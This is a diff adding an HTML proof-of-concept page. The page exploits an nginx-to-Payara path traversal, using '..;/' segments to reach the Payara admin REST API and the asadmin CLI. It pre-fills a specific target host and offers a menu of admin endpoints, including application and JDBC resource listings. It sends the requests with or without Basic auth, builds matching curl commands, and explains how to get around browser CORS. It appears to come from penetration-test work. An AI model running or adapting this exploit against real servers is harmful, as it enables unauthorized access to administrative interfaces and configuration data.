@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PoC — Payara Admin via nginx Path Traversal</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: "Segoe UI", system-ui, sans-serif; background: #1a1a2e; color: #e0e0e0; padding: 2rem; }
+    h1 { font-size: 1.3rem; margin-bottom: 0.3rem; color: #ff6b6b; }
+    .subtitle { font-size: 0.85rem; color: #888; margin-bottom: 1.5rem; }
+    .card { background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 1.5rem; margin-bottom: 1.2rem; }
+    .card h2 { font-size: 1rem; color: #e94560; margin-bottom: 0.8rem; }
+    label { display: block; font-size: 0.8rem; color: #aaa; margin-bottom: 0.25rem; margin-top: 0.6rem; }
+    input[type="text"], input[type="password"] {
+      width: 100%; padding: 0.5rem 0.7rem; background: #0f3460; border: 1px solid #1a1a5e;
+      border-radius: 4px; color: #e0e0e0; font-family: monospace; font-size: 0.85rem;
+    }
+    input:focus { outline: none; border-color: #e94560; }
+    .row { display: flex; gap: 1rem; }
+    .row > div { flex: 1; }
+    select { padding: 0.5rem; background: #0f3460; border: 1px solid #1a1a5e; border-radius: 4px; color: #e0e0e0; font-size: 0.85rem; width: 100%; }
+    button {
+      margin-top: 1rem; padding: 0.6rem 1.8rem; background: #e94560; color: #fff; border: none;
+      border-radius: 4px; font-size: 0.9rem; cursor: pointer; font-weight: 600;
+    }
+    button:hover { background: #c73652; }
+    button:disabled { opacity: 0.5; cursor: not-allowed; }
+    .response-panel { margin-top: 1rem; }
+    .response-panel h3 { font-size: 0.85rem; color: #aaa; margin-bottom: 0.5rem; }
+    .status-line { font-family: monospace; font-size: 0.9rem; padding: 0.4rem 0.7rem; border-radius: 4px; display: inline-block; margin-bottom: 0.5rem; }
+    .status-ok { background: #1b4332; color: #95d5b2; }
+    .status-unauth { background: #5a2d0c; color: #ffba49; }
+    .status-err { background: #4a0e0e; color: #ff6b6b; }
+    .status-other { background: #1a1a5e; color: #b0b0ff; }
+    pre {
+      background: #0a0a1a; border: 1px solid #1a1a5e; border-radius: 4px; padding: 1rem;
+      font-size: 0.8rem; line-height: 1.5; overflow-x: auto; white-space: pre-wrap;
+      word-break: break-all; max-height: 500px; overflow-y: auto; color: #c0c0c0;
+    }
+    pre .header-name { color: #56b6c2; }
+    pre .header-value { color: #e5c07b; }
+    .info { background: #0f3460; border-left: 3px solid #e94560; padding: 0.8rem 1rem; font-size: 0.8rem; line-height: 1.5; border-radius: 0 4px 4px 0; margin-bottom: 1rem; }
+    .info code { background: #1a1a5e; padding: 0.1rem 0.4rem; border-radius: 3px; font-size: 0.8rem; color: #ff6b6b; }
+    .tabs { display: flex; gap: 0; margin-bottom: -1px; position: relative; z-index: 1; }
+    .tab { padding: 0.4rem 1rem; background: #0a0a1a; border: 1px solid #1a1a5e; border-bottom: none; border-radius: 4px 4px 0 0; cursor: pointer; font-size: 0.8rem; color: #888; }
+    .tab.active { background: #0a0a1a; color: #e0e0e0; border-color: #e94560; border-bottom: 1px solid #0a0a1a; }
+    .payload-preview { font-family: monospace; font-size: 0.8rem; background: #0a0a1a; border: 1px solid #1a1a5e; border-radius: 4px; padding: 0.6rem 1rem; color: #56b6c2; margin-top: 0.5rem; word-break: break-all; }
+  </style>
+</head>
+<body>
+
+  <h1>Payara DAS Admin Access via nginx Path Traversal</h1>
+  <p class="subtitle">PoC — WSTG-CONF-05 / CWE-668 — Semicolon path-parameter traversal bypasses nginx routing</p>
+
+  <div class="info">
+    <strong>Vulnerability:</strong> nginx treats <code>..;</code> as part of the path segment (opaque),
+    but Payara/GlassFish strips the <code>;...</code> path parameter and resolves <code>..</code> as directory traversal.
+    This allows requests routed through <code>/portal/api/v2/</code> on nginx to escape to arbitrary Payara
+    back-end paths such as <code>/management/domain</code> (REST admin API) and <code>/__asadmin/</code> (CLI interface).
+  </div>
+
+  <div class="card">
+    <h2>Request Configuration</h2>
+
+    <label for="baseUrl">Target Base URL</label>
+    <input type="text" id="baseUrl" value="https://lic.pt.2c8.com">
+
+    <label for="traversalPath">Traversal Path (edit to test other endpoints)</label>
+    <select id="traversalPath">
+      <option value="/portal/api/v2/..;/..;/management/domain">/portal/api/v2/..;/..;/management/domain  (REST Admin API)</option>
+      <option value="/portal/api/v2/..;/..;/__asadmin/">/portal/api/v2/..;/..;/__asadmin/  (CLI interface)</option>
+      <option value="/portal/api/v2/..;/..;/__asadmin/uptime">/portal/api/v2/..;/..;/__asadmin/uptime</option>
+      <option value="/portal/api/v2/..;/..;/__asadmin/version">/portal/api/v2/..;/..;/__asadmin/version</option>
+      <option value="/portal/api/v2/..;/..;/__asadmin/list-applications">/portal/api/v2/..;/..;/__asadmin/list-applications</option>
+      <option value="/portal/api/v2/..;/..;/__asadmin/list-jdbc-resources">/portal/api/v2/..;/..;/__asadmin/list-jdbc-resources</option>
+      <option value="/portal/api/v2/..;/..;/management/domain/resources">/portal/api/v2/..;/..;/management/domain/resources</option>
+      <option value="/portal/api/v2/..;/..;/management/domain/configs/config/server-config">/portal/api/v2/..;/..;/management/domain/configs/config/server-config</option>
+      <option value="/portal/api/v2/..;/..;/management/domain/servers/server/server">/portal/api/v2/..;/..;/management/domain/servers/server/server</option>
+      <option value="/portal/api/v2/..;/..;/management/domain/version">/portal/api/v2/..;/..;/management/domain/version</option>
+      <option value="/portal/api/v2/..;/..;/monitoring/domain">/portal/api/v2/..;/..;/monitoring/domain</option>
+    </select>
+
+    <div class="row">
+      <div>
+        <label for="username">Username (Basic Auth)</label>
+        <input type="text" id="username" placeholder="admin">
+      </div>
+      <div>
+        <label for="password">Password (Basic Auth)</label>
+        <input type="password" id="password" placeholder="(leave blank for empty password)">
+      </div>
+    </div>
+
+    <label>Constructed URL</label>
+    <div class="payload-preview" id="constructedUrl"></div>
+
+    <button id="sendBtn" onclick="sendRequest()">Send Request</button>
+    <button onclick="sendWithoutAuth()" style="background:#0f3460;margin-left:0.5rem;">Send Without Auth</button>
+  </div>
+
+  <div class="card response-panel" id="responseCard" style="display:none;">
+    <h2>Response</h2>
+    <div id="statusLine"></div>
+
+    <div class="tabs" style="margin-top:0.8rem;">
+      <div class="tab active" onclick="showTab('headers')">Headers</div>
+      <div class="tab" onclick="showTab('body')">Body</div>
+      <div class="tab" onclick="showTab('raw')">Raw</div>
+    </div>
+
+    <pre id="headersContent"></pre>
+    <pre id="bodyContent" style="display:none;"></pre>
+    <pre id="rawContent" style="display:none;"></pre>
+  </div>
+
+  <div class="card" style="border-color:#333;">
+    <h2 style="color:#888;">curl Equivalent</h2>
+    <pre id="curlCmd" style="color:#95d5b2;"></pre>
+  </div>
+
+<script>
+  function updateUrl() {
+    const base = document.getElementById('baseUrl').value.replace(/\/+$/, '');
+    const path = document.getElementById('traversalPath').value;
+    document.getElementById('constructedUrl').textContent = base + path;
+    updateCurl();
+  }
+
+  function updateCurl() {
+    const base = document.getElementById('baseUrl').value.replace(/\/+$/, '');
+    const path = document.getElementById('traversalPath').value;
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+    const url = base + path;
+    let cmd = 'curl -k -v';
+    if (user) cmd += ` -u '${user}:${pass}'`;
+    cmd += ` --path-as-is '${url}'`;
+    document.getElementById('curlCmd').textContent = cmd;
+  }
+
+  document.getElementById('baseUrl').addEventListener('input', updateUrl);
+  document.getElementById('traversalPath').addEventListener('change', updateUrl);
+  document.getElementById('username').addEventListener('input', updateCurl);
+  document.getElementById('password').addEventListener('input', updateCurl);
+  updateUrl();
+
+  function showTab(name) {
+    ['headers', 'body', 'raw'].forEach(t => {
+      document.getElementById(t + 'Content').style.display = t === name ? '' : 'none';
+      document.querySelectorAll('.tab').forEach(el => el.classList.toggle('active', el.textContent.toLowerCase() === name));
+    });
+  }
+
+  function formatHeaders(text) {
+    return text.split('\n').map(line => {
+      const idx = line.indexOf(':');
+      if (idx > 0 && !line.startsWith('HTTP')) {
+        return `<span class="header-name">${line.substring(0, idx)}</span>:<span class="header-value">${line.substring(idx + 1)}</span>`;
+      }
+      return line;
+    }).join('\n');
+  }
+
+  function statusClass(code) {
+    if (code >= 200 && code < 300) return 'status-ok';
+    if (code === 401 || code === 403) return 'status-unauth';
+    if (code >= 400) return 'status-err';
+    return 'status-other';
+  }
+
+  async function doSend(withAuth) {
+    const base = document.getElementById('baseUrl').value.replace(/\/+$/, '');
+    const path = document.getElementById('traversalPath').value;
+    const url = base + path;
+    const btn = document.getElementById('sendBtn');
+    btn.disabled = true;
+    btn.textContent = 'Sending...';
+
+    const headers = { 'Accept': '*/*' };
+    if (withAuth) {
+      const user = document.getElementById('username').value;
+      const pass = document.getElementById('password').value;
+      if (user) {
+        headers['Authorization'] = 'Basic ' + btoa(user + ':' + pass);
+      }
+    }
+
+    try {
+      const resp = await fetch(url, { method: 'GET', headers, mode: 'cors', credentials: 'omit' });
+      const body = await resp.text();
+      const statusCode = resp.status;
+      const statusText = resp.statusText || '';
+
+      let hdrs = `HTTP/1.1 ${statusCode} ${statusText}\n`;
+      for (const [k, v] of resp.headers) { hdrs += `${k}: ${v}\n`; }
+
+      document.getElementById('responseCard').style.display = '';
+      document.getElementById('statusLine').innerHTML =
+        `<span class="status-line ${statusClass(statusCode)}">${statusCode} ${statusText}</span>`;
+      document.getElementById('headersContent').innerHTML = formatHeaders(hdrs);
+      document.getElementById('bodyContent').textContent = body;
+      document.getElementById('rawContent').textContent = hdrs + '\n' + body;
+      showTab('headers');
+    } catch (err) {
+      document.getElementById('responseCard').style.display = '';
+      document.getElementById('statusLine').innerHTML =
+        `<span class="status-line status-err">Network Error</span>`;
+      const msg = `Request failed: ${err.message}\n\n` +
+        `This is expected if CORS blocks the cross-origin request.\n` +
+        `To demonstrate the vulnerability:\n\n` +
+        `  1. Use the curl command below, or\n` +
+        `  2. Open Burp's embedded browser (CORS is not enforced), or\n` +
+        `  3. Use a browser with --disable-web-security flag\n\n` +
+        `The vulnerability exists at the network/nginx layer regardless of\n` +
+        `browser CORS policy — the server processes the path traversal.`;
+      document.getElementById('headersContent').textContent = msg;
+      document.getElementById('bodyContent').textContent = '';
+      document.getElementById('rawContent').textContent = msg;
+      showTab('headers');
+    }
+    btn.disabled = false;
+    btn.textContent = 'Send Request';
+  }
+
+  function sendRequest() { doSend(true); }
+  function sendWithoutAuth() { doSend(false); }
+</script>
+</body>
+</html>
